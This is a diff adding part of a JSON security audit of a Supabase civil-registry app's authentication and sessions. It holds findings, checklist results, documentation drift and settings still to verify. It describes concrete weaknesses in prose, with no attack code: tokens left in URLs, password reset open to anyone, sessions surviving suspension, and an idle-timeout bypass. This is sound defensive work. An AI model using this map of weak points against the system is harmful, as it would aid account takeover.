+          "line": 41,
+          "snippet": "const tokenHash = params.get(\"token_hash\");  -- token_hash + verifyOtp shape already supported"
+        }
+      ],
+      "description": "With the implicit flow, GoTrue's /verify redirect appends #access_token=...&refresh_token=... to the landing URL. supabase-js consumes and scrubs the fragment, and fragments are not sent in Referer, so exposure is limited to browser history/extensions/shoulder-surfing during the redirect. PKCE is not usable for these admin-initiated links (the code verifier would have to exist in the recipient's browser), but the app already supports the safer token_hash + verifyOtp shape (src/routes/index.tsx:74, :89). Which shape the project's email templates send is dashboard configuration.",
+      "attack_scenario": "A recovery link opened on a shared machine leaves a refresh token in a history entry or is captured by a malicious browser extension reading URLs.",
+      "impact": "Low-probability leakage of a full session during invite/recovery.",
+      "recommendation": "Change the Invite and Reset Password email templates to link to {{ .SiteURL }}/?token_hash={{ .TokenHash }}&type=invite (resp. recovery), which index.tsx already redeems with verifyOtp, and set flowType: 'pkce' on the client so no flow ever returns tokens in the URL.",
+      "secure_fix_example": "createClient(url, key, { auth: { storage: localStorage, persistSession: true, autoRefreshToken: true, flowType: 'pkce' } });\n<!-- email template -->\n<a href=\"{{ .SiteURL }}/?token_hash={{ .TokenHash }}&type=recovery\">Reset password</a>",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-011",
+      "title": "Session and password lifecycle values are not documented in the SFD (INSA D-03)",
+      "severity": "Low",
+      "cvss_v3_1": "N/A",
+      "confidence": "Confirmed",
+      "category": "Docs",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "D-03",
+          "C-05",
+          "E-03"
+        ],
+        "owasp_top10": [
+          "A05:2021"
+        ],
+        "owasp_api": [],
+        "asvs": [
+          "V1.2.4"
+        ],
+        "iso27001": [
+          "A.5.37"
+        ],
+        "nist_csf": [
+          "GV.PO-01"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "docs/security-functionality.md",
+          "line": 63,
+          "snippet": "## Session & cookie logic  -- covers transport, storage, CSRF rationale, idle timeout; no JWT expiry, refresh rotation/reuse, inactivity/time-box, password policy, MFA, lockout values"
+        },
+        {
+          "path": "docs/security-functionality.md",
+          "line": 86,
+          "snippet": "mounted once per portal in `WoredaShell.tsx`/`AdminShell.tsx`  -- files no longer exist; AppShell.tsx:406/566"
+        }
+      ],
+      "description": "D-03 passes when documented session values equal actual configuration. The only concrete documented values (20/25 min idle, 15 s poll) match code. Everything else INSA asks for (access-token lifetime, refresh-token rotation and reuse interval, server-side inactivity timeout, absolute time-box, regeneration on login/privilege change, password minimum, MFA stance, lockout) is either absent or delegated to 'Supabase Auth' without values, and the implementation files named are stale.",
+      "attack_scenario": "N/A (documentation).",
+      "impact": "Assessor cannot confirm D-03; configuration drift in the dashboard goes unnoticed.",
+      "recommendation": "Add a 'Session parameters' table to docs/security-functionality.md populated from the dashboard (and a periodic check), and fix the file references.",
+      "secure_fix_example": "| Parameter | Value | Where set |\n|---|---|---|\n| Access token (JWT) expiry | 900 s | Auth > Sessions |\n| Refresh reuse detection | ON, 10 s | Auth > Sessions |\n| Inactivity timeout | 30 min | Auth > Sessions |\n| Time-box | 12 h | Auth > Sessions |\n| Client idle sign-out | 25 min | src/config/idleTimeout.ts |",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-012",
+      "title": "Every sign-out (including idle timeout) is global: it revokes the user's sessions on all devices",
+      "severity": "Info",
+      "cvss_v3_1": "N/A",
+      "confidence": "Confirmed",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "C-05"
+        ],
+        "owasp_top10": [],
+        "owasp_api": [],
+        "asvs": [
+          "V3.3.1"
+        ],
+        "iso27001": [],
+        "nist_csf": []
+      },
+      "evidence": [
+        {
+          "path": "src/components/layout/AppShell.tsx",
+          "line": 389,
+          "snippet": "await supabase.auth.signOut();"
+        },
+        {
+          "path": "node_modules/@supabase/auth-js/dist/module/GoTrueClient.js",
+          "line": 3395,
+          "snippet": "async signOut(options = { scope: 'global' }) {"
+        }
+      ],
+      "description": "signOut() without arguments uses scope 'global', so logout correctly revokes the refresh token server-side (INSA-positive) but also ends the same user's sessions on other devices, including when the idle timer fires on one machine. If the network call fails, auth-js still clears the local session but the server-side refresh token stays valid. Shell sign-out also clears the query cache, wizard drafts and the offline queue (AppShell.tsx:395-401), which is good practice.",
+      "attack_scenario": "N/A.",
+      "impact": "Positive control with a UX side-effect; residual risk only when sign-out happens offline.",
+      "recommendation": "Keep global for explicit sign-out if that is the policy; consider scope 'local' for idle timeout. Document the choice (D-03).",
+      "secure_fix_example": "useIdleTimeout({ onTimeout: () => handleSignOut({ scope: 'local' }), ... })",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-013",
+      "title": "print_officer accounts cannot be invited or sent a password-reset link by any Edge Function",
+      "severity": "Info",
+      "cvss_v3_1": "N/A",
+      "confidence": "Likely",
+      "category": "Business Logic",
+      "module": "Settings",
+      "refs": {
+        "insa": [
+          "B-04"
+        ],
+        "owasp_top10": [],
+        "owasp_api": [],
+        "asvs": [],
+        "iso27001": [
+          "A.5.16"
+        ],
+        "nist_csf": [
+          "PR.AA-01"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "supabase/functions/invite-tenant-user/index.ts",
+          "line": 20,
+          "snippet": "const ALLOWED_ROLES = new Set([\"registry_clerk\",\"civil_registrar\",\"finance_clerk\",\"supervisor\",\"auditor\",\"viewer\"]);"
+        },
+        {
+          "path": "supabase/functions/send-password-reset-link/index.ts",
+          "line": 17,
+          "snippet": "const ALLOWED_TARGET_ROLES = new Set([ ... \"viewer\" ]);  -- no print_officer, no custom"
+        },
+        {
+          "path": "supabase/functions/invite-platform-admin/index.ts",
+          "line": 50,
+          "snippet": "if (role !== \"super_admin\" && role !== \"tenant_admin\") {"
+        }
+      ],
+      "description": "print_officer (and custom-role users) are outside both the invite and the admin reset allow-lists, so their onboarding/recovery must happen via a role change after inviting under another role, or via the Supabase dashboard - an undocumented, unaudited path.",
+      "attack_scenario": "N/A (lifecycle gap).",
+      "impact": "Out-of-band account handling for a role that prints legal credentials; weaker audit trail.",
+      "recommendation": "Add print_officer (and custom, with custom_role_id validation) to the allow-lists, or document the intended path.",
+      "secure_fix_example": "const ALLOWED_ROLES = new Set([..., \"print_officer\"]);",
+      "effort": "S"
+    }
+  ],
+  "checklist": [
+    {
+      "id": "C-04",
+      "status": "PARTIAL",
+      "evidence": "src/integrations/supabase/client.ts:24 (storage: localStorage); no auth cookie anywhere (only sidebar_state UI cookie, src/components/ui/sidebar.tsx:86); CSP src/lib/security-headers.ts:52,56",
+      "note": "Bearer tokens (access + refresh) in localStorage, not HttpOnly/Secure/SameSite cookies. INSA gap not declared in docs. Compensating controls partially present (connect-src allow-list, object-src none, form-action self) but weakened by script-src 'unsafe-inline' and 4 HTML sinks; JWT lifetime/reuse detection UNVERIFIED. See WP-AUTH-003, WP-AUTH-010."
+    },
+    {
+      "id": "C-05",
+      "status": "PARTIAL",
+      "evidence": "src/config/idleTimeout.ts:7-8 (20 min warn / 25 min sign-out), src/hooks/useIdleTimeout.ts:79-84 (reset on mount), src/components/layout/AppShell.tsx:406,566; supabase/config.toml:1 (no session settings)",
+      "note": "Client idle logout exists and is in band, but is bypassed by closing/reopening the tab and not mounted on /set-password. Server-side inactivity timeout / time-box and JWT expiry UNVERIFIED (dashboard). Suspension does not end sessions. See WP-AUTH-002, -004, -009."
+    },
+    {
+      "id": "D-03",
+      "status": "PARTIAL",
+      "evidence": "docs/security-functionality.md:63-95",
+      "note": "Documented idle values match code; JWT expiry, refresh rotation/reuse, inactivity/time-box, password policy, MFA, lockout undocumented; file names stale. Regeneration on login: new GoTrue session per signInWithPassword (no fixation vector); privilege changes are DB-resolved per query (no JWT custom claims). See WP-AUTH-011."
+    },
+    {
+      "id": "E-03",
+      "status": "UNVERIFIED",
+      "evidence": "supabase/functions/*/index.ts auth.getUser() (8/8); supabase/config.toml:1; no access-token hook / auth.jwt() authorisation in migrations",
+      "note": "Platform JWT part only (QR token claims belong to crypto-qr). Verification code PASS: every Edge Function validates via GoTrue (signature, exp, session). Signing algorithm (legacy HS256 vs asymmetric), access-token expiry, refresh rotation + reuse detection are dashboard-only and undocumented; no declared gap. See WP-AUTH-009."
+    }
+  ],
+  "drift": [
+    {
+      "claim": "Idle timeout hook is mounted once per portal in WoredaShell.tsx / AdminShell.tsx",
+      "source": "CLAUDE.md:410; docs/security-functionality.md:86",
+      "verdict": "CONTRADICTED",
+      "evidence": "src/components/layout/ has only AppShell.tsx; hook mounted at AppShell.tsx:406 (woreda) and :566 (admin)"
+    },
+    {
+      "claim": "20 idle minutes warning, 25 idle minutes forced sign-out, 15-second check interval, cross-tab localStorage sharing",
+      "source": "CLAUDE.md:406-417; docs/security-functionality.md:81-95",
+      "verdict": "CONFIRMED",
+      "evidence": "src/config/idleTimeout.ts:7,8,14,20; src/hooks/useIdleTimeout.ts:108"
+    },
+    {
+      "claim": "Absolute-timestamp check on a 15-second interval catches a laptop waking from sleep past the limit immediately",
+      "source": "CLAUDE.md:411-413; src/config/idleTimeout.ts:10-13",
+      "verdict": "CONFIRMED",
+      "evidence": "src/hooks/useIdleTimeout.ts:108-111 and visibilitychange handler. Limitation not covered by the claim: on a fresh page load the hook sets lastActivity=now and overwrites the stored timestamp (useIdleTimeout.ts:79,84), so a closed-and-reopened session resumes (WP-AUTH-004)"
+    },
+    {
+      "claim": "login.tsx shows a static 'Forgot your password? Contact your administrator.' message",
+      "source": "CLAUDE.md:355-357",
+      "verdict": "CONTRADICTED",
+      "evidence": "No 'Forgot' string in src/routes/login.tsx; closest is the generic footer at login.tsx:330 (Amharic 'having a problem? contact your System Admin')"
+    },
+    {
+      "claim": "Password reset for a locked-out user is admin-initiated, not self-service",
+      "source": "CLAUDE.md:350",
+      "verdict": "CONTRADICTED",
+      "evidence": "True for the UI only. GoTrue /auth/v1/recover is callable by anyone with the public key for any email (the same endpoint send-password-reset-link/index.ts:165 uses); the resulting link is redeemed by src/routes/index.tsx:74 (WP-AUTH-008)"
+    },
+    {
+      "claim": "send-password-reset-link restricts the target to staff roles (never tenant_admin/super_admin)",
+      "source": "CLAUDE.md:375-377",
+      "verdict": "CONTRADICTED",
+      "evidence": "supabase/functions/send-password-reset-link/index.ts:116-118 lets a super_admin caller target tenant_admin and super_admin (canTargetPlatformAdmin); tenant_admin callers are staff-only"
+    },
+    {
+      "claim": "Session regeneration is handled entirely by Supabase Auth's refresh-token rotation",
+      "source": "docs/security-functionality.md:78-80",
+      "verdict": "NOT FOUND",
+      "evidence": "No repo artefact states whether rotation/reuse detection is enabled or its interval; supabase/config.toml:1 has only project_id (WP-AUTH-009)"
+    },
+    {
+      "claim": "All 4 Edge Functions authenticate internally ... deploy with verify_jwt:false",
+      "source": "docs/security-hardening.md:39-41",
+      "verdict": "CONTRADICTED",
+      "evidence": "8 functions exist; all 8 call auth.getUser (internal auth CONFIRMED). scripts/deploy-functions.sh:40 passes no --no-verify-jwt and supabase/config.toml has no [functions.*] verify_jwt=false, so the repo's deploy path yields verify_jwt=true (live value UNVERIFIED; api-edge owns)"
+    },
+    {
+      "claim": "Rate limiting applies to the three abuse-prone Private endpoints (invite-tenant-user, invite-platform-admin, resend-platform-invite)",
+      "source": "docs/api-security.md:43-50",
+      "verdict": "CONTRADICTED",
+      "evidence": "Five functions call checkRateLimit: those three plus resend-tenant-invite/index.ts:78 and send-password-reset-link/index.ts:78 (undercount; control is broader than documented)"
+    },
+    {
+      "claim": "A suspended/inactive super_admin keeps a live session (suspension doesn't revoke the JWT)",
+      "source": "src/routes/admin.tsx:24-25",
+      "verdict": "CONFIRMED",
+      "evidence": "No admin.signOut/ban anywhere; suspension is app_user UPDATE only (UsersRolesTab.tsx:257, PlatformUsersTab.tsx:265,828). Same applies to woreda staff, where woreda.tsx:21-22 has no status gate (WP-AUTH-002)"
+    },
+    {
+      "claim": "Operator checklist: lower Auth rate limits; enable CAPTCHA and leaked password protection",
+      "source": "docs/security-hardening.md:64-67; docs/testing-scope.md:52-55",
+      "verdict": "NOT FOUND",
+      "evidence": "Checkboxes still unchecked; login.tsx:96 passes no captchaToken, so enabling CAPTCHA would break sign-in (WP-AUTH-005)"
+    }
+  ],
+  "artifacts": [
+    "docs/audit/2026-09-24/findings/auth-session.md",
+    "docs/audit/2026-09-24/findings/auth-session.json",
+    "docs/audit/2026-09-24/raw/auth-session-evidence.txt"
+  ],
+  "unverified_dashboard_settings": [
+    "Settings > JWT Keys: legacy JWT secret (HS256) still in use, or asymmetric signing keys (ES256/RS256) active; legacy secret revoked?",
+    "Authentication > Sessions: Access token (JWT) expiry seconds",
+    "Authentication > Sessions: Detect and revoke potentially compromised refresh tokens (ON/OFF) and Refresh token reuse interval",
+    "Authentication > Sessions: Time-box user sessions (value) and Inactivity timeout (value); Enforce single session per user",
+    "Authentication > Providers > Email: Allow new users to sign up; Confirm email; Secure email change; Secure password change; Minimum password length; Password requirements",
+    "Authentication > Sign In / Providers: Anonymous sign-ins (ON/OFF); any enabled OAuth/phone providers",
+    "Authentication > Attack Protection: CAPTCHA provider (ON/OFF); Prevent use of leaked passwords (ON/OFF)",
+    "Authentication > Rate Limits: sign-in/sign-up per IP, token refresh, email sent per hour, OTP/verification",
+    "Authentication > Multi-Factor: TOTP / WebAuthn / Phone enabled; max enrolled factors",
+    "Authentication > Email Templates: Invite and Reset Password link shape ({{ .ConfirmationURL }} vs token_hash); Email OTP expiration",
+    "Authentication > URL Configuration: Site URL and Redirect URL allow-list entries",
+    "Edge Functions: per-function verify_jwt as deployed",
+    "Plan tier (Pro required for time-box/inactivity timeout and leaked-password protection)"
+  ]
+}
